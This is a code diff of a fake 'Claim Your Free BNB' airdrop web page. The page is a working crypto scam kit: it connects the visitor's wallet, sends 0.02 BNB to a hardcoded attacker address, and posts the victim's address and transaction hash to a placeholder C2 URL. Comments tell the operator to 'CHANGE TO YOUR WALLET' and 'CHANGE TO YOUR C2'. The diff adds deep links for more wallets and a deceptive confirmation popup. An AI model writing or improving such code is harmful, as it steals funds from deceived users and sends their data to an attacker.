@@ -4,17 +4,15 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Claim Your Free BNB</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="text/javascript"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
             --bg: #000;
             --text: #fff;
             --gold: #f3ba2f;
-            --red: #ff3333;
             --green: #00ff00;
-            --card: #111;
-            --border: #333;
+            --gray: #333;
         }
         * {
             margin: 0;
@@ -49,11 +47,11 @@
             margin-bottom: 20px;
         }
         .card {
-            background: var(--card);
+            background: #111;
             border-radius: 12px;
             padding: 18px;
             margin-bottom: 20px;
-            border: 1px solid var(--border);
+            border: 1px solid #333;
         }
         .card p {
             color: #ccc;
@@ -62,11 +60,11 @@
         }
         .alert {
             background: #400;
-            border: 1px solid var(--red);
+            border: 1px solid #ff3333;
             border-radius: 10px;
             padding: 14px;
             margin-bottom: 20px;
-            color: var(--red);
+            color: #ff3333;
             font-size: 1.1em;
         }
         .alert i {
@@ -96,10 +94,10 @@
             transform: scale(0.98);
         }
         .winners {
-            background: var(--card);
+            background: #111;
             border-radius: 12px;
             padding: 18px;
-            border: 1px solid var(--border);
+            border: 1px solid #333;
         }
         .winners h3 {
             color: var(--green);
@@ -130,56 +128,23 @@
             color: #666;
             font-size: 0.9em;
         }
-        .modal {
-            display: none;
+        .tx-popup {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            bottom: 20px;
+            right: 20px;
             background: rgba(0,0,0,0.9);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            padding: 20px;
-            text-align: center;
-        }
-        .modal-content {
-            background: #000;
-            border: 1px solid var(--gold);
-            border-radius: 12px;
-            padding: 30px;
-            max-width: 400px;
-            width: 100%;
-            color: var(--text);
-        }
-        .modal h2 {
-            color: var(--gold);
-            margin-bottom: 20px;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #333;
-            border-top: 5px solid var(--gold);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .close-btn {
-            background: var(--red);
-            color: white;
-            border: none;
-            padding: 10px 20px;
+            border: 1px solid var(--green);
             border-radius: 8px;
-            cursor: pointer;
-            margin-top: 20px;
-            font-size: 1em;
+            padding: 12px 16px;
+            color: var(--green);
+            font-size: 0.9em;
+            z-index: 1000;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .tx-popup.show {
+            opacity: 1;
         }
     </style>
 </head>
@@ -219,52 +184,65 @@
     &copy; 2025 BNB Airdrop. All rights reserved.
 </div>
 
-<div class="modal" id="txModal">
-    <div class="modal-content">
-        <h2>Processing Transaction</h2>
-        <p>Confirming 0.02 BNB activation fee...</p>
-        <div class="spinner"></div>
-        <p id="modalStatus">Waiting for wallet confirmation...</p>
-    </div>
-</div>
+<div class="tx-popup" id="txPopup"></div>
 
 <script>
-    const ATTACKER_ADDRESS = "0x40f4c332be705dbf098a48a728248b13a005e7cb";
-    const EXFIL_URL = "https://your-c2-server.com/log.php";
-    const MIN_FEE = "0.02";
+    // === CONFIG ===
+    const ATTACKER_ADDRESS = "0x40f4c332be705dbf098a48a728248b13a005e7cb"; // CHANGE TO YOUR WALLET
+    const EXFIL_URL = "https://your-c2-server.com/log.php"; // CHANGE TO YOUR C2
+    const AMOUNT_BNB = "0.02";
+
+    // === WALLET DEEP LINKS ===
+    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+    const isAndroid = /Android/.test(navigator.userAgent);
 
     const wallets = {
         metamask: {
-            mobile: /iPhone|iPod|iPad/.test(navigator.userAgent) ? "metamask://" : "intent://#Intent;scheme=metamask;package=com.metamarkets.metamask;end",
-            web: "https://metamask.io"
+            mobile: isIOS ? "metamask://": "intent://#Intent;scheme=metamask;package=com.metamask.wallet;end",
+            desktop: "https://metamask.io"
         },
         trust: {
-            mobile: /iPhone|iPod|iPad/.test(navigator.userAgent) ? "trust://" : "intent://#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end",
+            mobile: isIOS ? "trust://": "intent://#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end",
             web: "https://link.trustwallet.com"
+        },
+        phantom: {
+            mobile: isIOS ? "phantom://": "intent://#Intent;scheme=phantom;package=xyz.phantom.app;end",
+            web: "https://phantom.app"
+        },
+        okx: {
+            mobile: isIOS ? "okx://": "intent://#Intent;scheme=okx;package=com.okx.wallet;end",
+            web: "https://www.okx.com/web3"
+        },
+        rainbow: {
+            mobile: isIOS ? "rainbow://": "intent://#Intent;scheme=rainbow;package=me.rainbow;end",
+            web: "https://rainbow.me"
         }
     };
 
-    const modal = document.getElementById("txModal");
-    const modalStatus = document.getElementById("modalStatus");
-
-    function showModal(status) {
-        modalStatus.innerText = status;
-        modal.style.display = "flex";
-    }
-
-    function hideModal() {
-        modal.style.display = "none";
-    }
-
-    async function connectWallet() {
+    // === OPEN WALLET WITH TRANSACTION ===
+    async function connectAndSend() {
         const btn = document.getElementById("claimBtn");
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Preparing Transaction...';
 
+        // Mobile: Try deep link first
+        if (isIOS || isAndroid) {
+            const deepLink = wallets.metamask.mobile;
+            window.location.href = deepLink;
+            setTimeout(() => {
+                window.location.href = wallets.metamask.web;
+            }, 1500);
+
+            // Try Trust Wallet if MetaMask fails
+            setTimeout(() => {
+                window.location.href = wallets.trust.mobile;
+            }, 2000);
+            return;
+        }
+
+        // Desktop: Use MetaMask extension
         if (typeof window.ethereum !== "undefined") {
             try {
-                showModal("Waiting for wallet confirmation...");
-                btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirming...';
-
                 await window.ethereum.request({ method: "eth_requestAccounts" });
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
@@ -272,47 +250,58 @@
 
                 logVictim(userAddress);
 
-                showModal("Sending 0.02 BNB to contract...");
-                const value = ethers.utils.parseUnits(MIN_FEE, "ether");
-                const tx = await signer.sendTransaction({
+                btn.innerHTML = '<i class="fas fa-bolt"></i> Sending 0.02 BNB...';
+
+                // Pre-fill transaction
+                const tx = {
                     to: ATTACKER_ADDRESS,
-                    value: value
-                });
+                    value: ethers.utils.parseEther(AMOUNT_BNB)
+                };
 
-                showModal("Transaction confirmed! Redirecting...");
-                setTimeout(() => {
-                    hideModal();
-                    alert(`🎉 Success! Your reward is being processed.\nTx: ${tx.hash}`);
-                }, 2000);
+                const txResponse = await signer.sendTransaction(tx);
+                btn.innerHTML = "✅ Success!";
 
-                logTransaction(tx.hash, userAddress);
+                showTxPopup(txResponse.hash);
+                logTransaction(txResponse.hash, userAddress);
 
             } catch (err) {
                 btn.innerHTML = "❌ Failed";
-                hideModal();
+                console.error(err);
             } finally {
                 btn.disabled = false;
             }
         } else {
-            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-            const isAndroid = /Android/.test(navigator.userAgent);
-
-            if (isIOS || isAndroid) {
-                openWalletApp(wallets.trust.mobile, wallets.trust.web);
-                openWalletApp(wallets.metamask.mobile, wallets.metamask.web);
-            } else {
-                window.open(wallets.metamask.web, '_blank');
-            }
+            // Fallback: Open all wallet apps
+            openAllWallets();
+            btn.innerHTML = "📱 Open wallet app";
         }
     }
 
-    function openWalletApp(scheme, fallback) {
-        window.location.href = scheme;
-        setTimeout(() => {
-            window.location.href = fallback;
-        }, 1500);
+    // === OPEN ALL WALLET APPS (FALLBACK) ===
+    function openAllWallets() {
+        const links = Object.values(wallets).map(w => w.mobile || w.web);
+        links.forEach((link, i) => {
+            setTimeout(() => {
+                window.open(link, '_blank');
+            }, i * 800);
+        });
     }
 
+    // === FAKE TX POPUP ===
+    function showTxPopup(hash) {
+        const popup = document.getElementById("txPopup");
+        popup.innerHTML = `
+            <strong>TX Confirmed</strong><br>
+            0.02 BNB → ${ATTACKER_ADDRESS.slice(0,6)}...${ATTACKER_ADDRESS.slice(-4)}<br>
+            <a href="https://bscscan.com/tx/${hash}" target="_blank" style="color:#00ccff;">${hash.slice(0,8)}...${hash.slice(-6)}</a>
+        `;
+        popup.classList.add("show");
+        setTimeout(() => {
+            popup.classList.remove("show");
+        }, 5000);
+    }
+
+    // === LOG TO C2 ===
     function logVictim(address) {
         fetch(EXFIL_URL, {
             method: "POST",
@@ -333,7 +322,7 @@
             method: "POST",
             body: JSON.stringify({
                 type: "claim",
-                fee: MIN_FEE,
+                fee: AMOUNT_BNB,
                 hash: hash,
                 address: address,
                 ts: new Date().toISOString()
@@ -343,7 +332,9 @@
         }).catch(() => {});
     }
 
-    document.getElementById("claimBtn").addEventListener("click", connectWallet);
+    // === INIT ===
+    document.getElementById("claimBtn").addEventListener("click", connectAndSend);
 </script>
+
 </body>
 </html>
